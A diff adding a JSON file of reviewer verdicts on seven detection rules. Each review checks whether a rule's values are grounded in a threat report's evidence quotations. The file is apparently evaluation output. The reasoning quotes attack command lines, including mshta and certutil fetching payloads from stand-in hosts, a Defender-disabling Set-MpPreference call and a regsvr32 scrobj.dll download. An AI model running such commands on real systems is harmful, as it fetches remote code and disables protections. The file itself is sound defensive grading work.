@@ -1,0 +1,92 @@
+{
+ "batch": "D4",
+ "reviewer": "R1",
+ "role": "primary",
+ "read_other_files": false,
+ "workflow_run": "wf_86e69ccc-de1",
+ "recorded_on": "2026-10-15",
+ "reviews": [
+  {
+   "id": "D4-01",
+   "verdict": "present",
+   "confidence": 96,
+   "reasoning": "The rule requires ParentImage|endswith '\\winword.exe'. 'winword.exe' appears in neither evidence quotation ('mshta.exe https://files.cranemail.test/portal/invoice.hta' and 'executed an HTML application payload directly from the network'), and the report never mentions Word. The assumptions list is empty. The other values (mshta.exe, http, .hta) do occur in the first quotation, so the unsupported discriminating value is the parent process.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The title and description say 'from Word', which the report does not support; the report only says 'a child process' after an attachment was opened.",
+    "The positive events use a WINWORD.EXE parent, which the report never states, but they are consistent with the rule and genuinely show mshta fetching a remote HTA.",
+    "I evaluated all six events by hand: both positives match, and the negatives and look-alikes do not."
+   ]
+  },
+  {
+   "id": "D4-02",
+   "verdict": "present",
+   "confidence": 96,
+   "reasoning": "CommandLine|contains|all includes '-split'. The two evidence quotations are 'certutil.exe -urlcache' and 'http://stage.cranemail.test/pack/updsvc.bin', and neither contains '-split'. The switch appears only in the surrounding report text, which is not evidence, and assumptions is empty. certutil.exe, -urlcache and http are all supported by the quotations.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The look-alike 'certutil.exe -urlcache * delete' shares -urlcache but lacks -split and http, so it correctly does not match.",
+    "The rule is otherwise consistent, and the tags match the T1105 row of the table."
+   ]
+  },
+  {
+   "id": "D4-03",
+   "verdict": "present",
+   "confidence": 95,
+   "reasoning": "CommandLine|contains is an OR list with two values. The first, 'Set-MpPreference -DisableRealtimeMonitoring', is in the evidence quotation. The second, 'Set-MpPreference -DisableIOAVProtection', is in neither the single quotation nor the report text, and assumptions is empty. This is an ungrounded alternative that G4 should stop.",
+   "events_ok": true,
+   "incidental_issues": [
+    "No positive event exercises the unsupported IOAVProtection branch, so the defect is invisible to the positive/negative tests.",
+    "Positive 2 uses '-DisableRealtimeMonitoring 1' instead of $true, which is still a genuine disable.",
+    "The look-alikes (-ScanAvgCPULoadFactor, Get-MpPreference ... DisableRealtimeMonitoring) do not match the rule, as intended."
+   ]
+  },
+  {
+   "id": "D4-04",
+   "verdict": "present",
+   "confidence": 94,
+   "reasoning": "selection_dll requires CommandLine|contains 'scrobj.dll'. It is absent from both evidence quotations, and the declared assumption's covers list contains only '/i:http://'. The assumption's statement text mentions scrobj.dll, but the covers list does not include it, so it is not covered. '/i:http://' is validly covered, and '/i:https://' and regsvr32.exe are in the first quotation, so scrobj.dll is the unsupported discriminating value.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The assumption's prose mentions scrobj.dll while its covers omit it; this is a decoy that does not satisfy G4.",
+    "The quoted command line in the report is explicitly truncated and has no scrobj.dll, yet both positive events append it, so positives are tailored to the rule rather than the report.",
+    "The look-alike 'regsvr32.exe /u /s scrobj.dll' correctly fails the /i:http requirement."
+   ]
+  },
+  {
+   "id": "D4-05",
+   "verdict": "present",
+   "confidence": 88,
+   "reasoning": "Image|endswith '\\wscript.exe' is a positive condition value. The two evidence quotations cover only '203.0.113.77', 'TCP port 8443' and the port-approval sentence, and the report says only 'a script host process', never wscript.exe. assumptions is empty, so 'wscript.exe' is unsupported. DestinationIp and DestinationPort (203.0.113.77, 8443) are in the first quotation. I treated the process name as a discriminating value because G4 does not exempt process names.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The rule pins a single documentation IP and an invented process, so it is both IOC-style and narrow.",
+    "The positive events were invented to match the unsupported wscript.exe, so they exercise the defect rather than the report.",
+    "The look-alikes (wscript.exe to 198.51.100.40:8443, agent.exe to 192.0.2.60:8443) correctly do not match."
+   ]
+  },
+  {
+   "id": "D4-06",
+   "verdict": "present",
+   "confidence": 94,
+   "reasoning": "Image|endswith '\\rundll32.exe' is a positive condition value. The single evidence quotation ('lookups for generated subdomains of telemetry-sync.example-cdn.test, for example a1b2c3d4e5.telemetry-sync.example-cdn.test') does not contain rundll32.exe. The word appears only in the surrounding report text, which is not evidence, and assumptions is empty. The QueryName suffix '.telemetry-sync.example-cdn.test' is supported by that quotation.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The look-alike rundll32 lookups (app.telemetry-sync.vendor.example and ocsp.certs-sample.example) are only loosely similar to the beaconing, but they are benign and correctly not matched.",
+    "Both positives match the rule and exhibit generated-subdomain DNS beaconing from rundll32."
+   ]
+  },
+  {
+   "id": "D4-07",
+   "verdict": "present",
+   "confidence": 75,
+   "reasoning": "The three CommandLine values (/create, /sc minute, \\Users\\Public\\Libraries) all occur in the schtasks.exe quotation after normalisation. Image|endswith '\\Windows\\System32\\schtasks.exe' normalises to 'windowssystem32schtasks.exe', which does not occur in the quotation (it has only 'schtasks.exe /create ...'). The strings 'windows' and 'system32' appear nowhere in the evidence or report, and assumptions is empty. The defect is subtle, because the basename schtasks.exe is supported. The unsupported full-path prefix is the only candidate, which lowers my confidence.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The title says 'Every Minute', but the evidence is '/sc minute /mo 5' (every five minutes).",
+    "The rule does not constrain /mo, which is fine for the claim.",
+    "Both positives match and both look-alikes (daily task; minute task pointing at C:\\Tools) correctly do not."
+   ]
+  }
+ ]
+}
